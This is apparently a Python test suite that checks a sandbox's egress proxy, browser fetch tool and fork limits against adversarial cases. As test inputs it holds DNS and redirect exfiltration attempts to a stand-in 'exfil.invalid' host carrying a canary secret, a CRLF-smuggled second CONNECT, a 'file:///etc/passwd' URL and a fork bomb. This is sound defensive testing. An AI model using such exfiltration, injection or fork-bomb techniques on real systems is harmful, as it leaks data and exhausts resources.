"""Adversarial egress / browser / fork-limit cases (cycle-005).

Unauthorized egress = any byte reaching a host:port that is not on the capability's
allowlist, any DNS resolution of a non-allowlisted name, any bypass of the proxy, or a
budget that does not hold. It is judged from the HOST side: fixture servers record every
request, the resolver is instrumented, and the audit log is read back.

Success metric: unauthorized_egress == 0, and every proxy attempt is audited.
"""
import json
import os
import sys
import threading
import time
import unittest
from unittest import mock

from tests.egress_fixtures import Fixture, big, redirect
from tests.helpers import Harness, TOOL_ROOT, host_procs, wait_gone, worker
from control_plane import AuditLog, HandlerTimeout, RiskLevel
from tools import SubprocessHandler, ToolRegistry, WorkerSpec, browser_fetch_spec
from tools import egress as egress_mod

CANARY = "c4n4ry5ecret0123456789abcdef"


class EgressAdversarialTests(unittest.TestCase):
    def setUp(self):
        self.h = Harness(inprocess=False)
        self.ok = Fixture()           # allowlisted
        self.blocked = Fixture()      # never allowlisted: must receive nothing
        self.ok.routes.update({
            "/to-blocked-host": redirect("http://exfil.invalid/" + CANARY),
            "/to-blocked-port": redirect(f"{self.blocked.base}/x?d={CANARY}"),
            "/hop1": redirect("/hop2"), "/hop2": redirect("/hop3"), "/hop3": redirect("/page"),
            "/big": big(1024 * 1024),
        })
        self.resolved: list[str] = []
        real = egress_mod._resolve

        def counting(host, port):
            self.resolved.append(host)
            return real(host, port)
        p = mock.patch.object(egress_mod, "_resolve", side_effect=counting)
        p.start()
        self.addCleanup(p.stop)
        self.attempts = 0
        real_handle = egress_mod.EgressProxy._handle

        def handle(proxy, conn):
            self.attempts += 1
            return real_handle(proxy, conn)
        p2 = mock.patch.object(egress_mod.EgressProxy, "_handle", handle)
        p2.start()
        self.addCleanup(p2.stop)

    def tearDown(self):
        self.ok.close()
        self.blocked.close()
        self.h.close()

    # -- helpers ----------------------------------------------------------------------------
    def raw(self, line, egress=None, **kw):
        spec = worker("raw_egress", egress=tuple(egress if egress is not None else (self.ok.entry,)), **kw)
        return SubprocessHandler(spec, audit=self.h.audit, capability="cap.test.raw")({"line": line})

    def browse(self, path_or_url, egress=None, **kw):
        url = path_or_url if "://" in path_or_url else self.ok.base + path_or_url
        spec = browser_fetch_spec(tuple(egress if egress is not None else (self.ok.entry,)), **kw)
        return SubprocessHandler(spec, audit=self.h.audit, capability="cap.browser.fetch")({"url": url})

    def audit_events(self):
        with open(self.h.audit_path) as fh:
            return [json.loads(line) for line in fh]

    def denied(self, reason):
        return [e for e in self.audit_events() if e["event"] == "egress_denied" and e["data"]["reason"] == reason]

    # -- cases (each returns True if an UNAUTHORIZED egress happened) -------------------------
    def _cases(self):
        P = self.ok.port
        yield "connect to non-allowlisted port", lambda: (
            self.raw(f"CONNECT 127.0.0.1:{self.blocked.port}\n")["reply"] != "DENIED not_allowlisted\n")
        yield "connect to non-allowlisted ip", lambda: (
            self.raw(f"CONNECT 127.0.0.2:{P}\n")["reply"] != "DENIED not_allowlisted\n")
        yield "connect to non-allowlisted name (no resolution)", lambda: (
            self.raw("CONNECT evil.invalid:80\n")["reply"] != "DENIED not_allowlisted\n" or "evil.invalid" in self.resolved)
        yield "DNS exfil via proxy hostname", lambda: (
            self.raw(f"CONNECT {CANARY}.exfil.invalid:53\n")["reply"] != "DENIED not_allowlisted\n"
            or any(CANARY in r for r in self.resolved))
        yield "DNS exfil via direct resolver", lambda: self.run_tool("udp_dns", {})["ok"]
        yield "direct TCP bypass of the proxy", lambda: (
            self.run_tool("tcp_connect", {"host": "127.0.0.1", "port": P}, egress=(self.ok.entry,))["ok"])
        for name, line in (("CRLF smuggled second CONNECT", f"CONNECT {self.ok.entry}\r\nCONNECT 127.0.0.1:{self.blocked.port}\n"),
                           ("uppercase host", f"CONNECT LOCALHOST:{P}\n"),
                           ("leading-zero port", f"CONNECT 127.0.0.1:0{P}\n"),
                           ("userinfo", f"CONNECT a@127.0.0.1:{P}\n"),
                           ("ipv6 literal", f"CONNECT [::1]:{P}\n"),
                           ("trailing token", f"CONNECT {self.ok.entry} HTTP/1.1\n"),
                           ("overlong line without newline", "CONNECT " + "a" * 1000),
                           ("non-ascii", f"CONNECT 127.0.0.1:{P}\u00e9\n"),
                           ("empty line", "\n")):
            yield f"malformed: {name}", (lambda line=line: self.raw(line)["reply"] not in ("DENIED malformed\n", ""))
        yield "rebinding guard (name resolving to loopback)", lambda: (
            self.raw(f"CONNECT localhost:{P}\n", egress=(f"localhost:{P}",))["reply"] != "DENIED resolved_non_global\n")
        yield "redirect to blocked host", lambda: (
            self.browse("/to-blocked-host").get("blocked", {}).get("reason") != "not_allowlisted"
            or any("exfil.invalid" in r for r in self.resolved))
        yield "redirect to blocked port (exfil in query)", lambda: (
            self.browse("/to-blocked-port").get("blocked", {}).get("reason") != "not_allowlisted")
        yield "connection budget", lambda: (
            self.browse("/hop1", egress_max_connections=2).get("blocked", {}).get("reason") != "connection_budget")
        yield "byte budget", self._byte_budget
        yield "capability without egress has no proxy", lambda: (
            self.raw(f"CONNECT {self.ok.entry}\n", egress=())["connected"])
        yield "non-http schemes", lambda: any(
            SubprocessHandler(browser_fetch_spec((self.ok.entry,)), audit=self.h.audit, capability="c")(
                {"url": u}).get("error") != "unsupported_scheme"
            for u in ("file:///etc/passwd", f"ftp://{self.ok.entry}/", "gopher://127.0.0.1/"))
        yield "fork bomb bounded", self._fork_bomb
        yield "egress at low risk refused", self._low_risk
        yield "egress without audit refused", self._no_audit
        yield "wildcard / cidr allowlist entries refused", self._wildcards

    def run_tool(self, name, args, egress=()):
        return SubprocessHandler(worker(name, egress=tuple(egress)), audit=self.h.audit, capability="c")(args)

    def _byte_budget(self):
        r = self.browse("/big", egress_max_bytes=4096)
        closed = [e for e in self.audit_events() if e["event"] == "egress_closed" and e["data"]["budget_exhausted"]]
        return r.get("ok") is True and r.get("bytes", 0) > 4096 or not closed

    def _fork_bomb(self):
        r = self.run_tool("fork_count", {"tries": 300})
        # max_procs defaults to 32 per sandbox (bwrap's init + the worker count towards it)
        bounded = r["errno"] is not None and r["forked"] < 32
        if not bounded:
            return True  # never launch the real bomb without a working limit
        argv0 = (SubprocessHandler(worker("echo"))._sandbox.python, "-I", "-S", "/worker/worker.py")
        peak = [0]
        stop = threading.Event()

        def sample():
            while not stop.is_set():
                peak[0] = max(peak[0], len(host_procs(argv0)))
                time.sleep(0.02)
        t = threading.Thread(target=sample, daemon=True)
        t.start()
        timed_out = False
        try:
            SubprocessHandler(worker("fork_bomb", timeout_s=3.0, max_procs=16))({})
        except HandlerTimeout:
            timed_out = True
        finally:
            stop.set()
            t.join()
        left = wait_gone(argv0)
        print(f"\nFORK_BOMB fork_count={r} bomb_peak_procs={peak[0]} timed_out={timed_out} left={len(left)}",
              file=sys.stderr)
        return not (bounded and timed_out and peak[0] <= 16 and not left)

    def _low_risk(self):
        reg = ToolRegistry(self.h.policy, self.h.cp, self.h.audit)
        try:
            reg.register_local("cap.low.net", RiskLevel.READ, "x", {"type": "object"},
                               worker("echo", egress=(self.ok.entry,)), by="zanabal")
        except ValueError as exc:
            return str(exc) != "egress_requires_risk_external"
        return True

    def _no_audit(self):
        try:
            SubprocessHandler(worker("echo", egress=(self.ok.entry,)))
        except ValueError:
            return False
        return True

    def _wildcards(self):
        for bad in ("*:80", "*.example.com:443", "0.0.0.0/0:80", "example.com", "example.com:0", "Example.com:80",
                    "example.com:65536", "a b:80"):
            try:
                WorkerSpec(TOOL_ROOT, "sample_tools", "echo", egress=(bad,))
                return True
            except ValueError:
                pass
        return False

    def test_zero_unauthorized_egress(self):
        bad, n = [], 0
        for name, attempt in self._cases():
            n += 1
            with self.subTest(case=name):
                if attempt():
                    bad.append(name)
        # host-side truth: the blocked server saw nothing, no canary was resolved anywhere
        if self.blocked.hits:
            bad.append(f"blocked fixture received {self.blocked.hits}")
        if any(CANARY in r for r in self.resolved):
            bad.append("canary resolved")
        # every proxy attempt is audited, and the chain verifies
        ev = [e for e in self.audit_events() if e["event"] in ("egress_allowed", "egress_denied", "egress_failed")]
        ok, count, err = AuditLog(self.h.audit_path).verify()
        print(f"\nEGRESS_ADVERSARIAL cases={n} unauthorized_egress={len(bad)} proxy_attempts={self.attempts} "
              f"audited_attempts={len(ev)} audit_chain_ok={ok} resolutions={self.resolved}", file=sys.stderr)
        self.assertGreaterEqual(n, 14)
        self.assertEqual(bad, [])
        self.assertEqual(len(ev), self.attempts)
        self.assertTrue(ok, err)


if __name__ == "__main__":
    unittest.main()
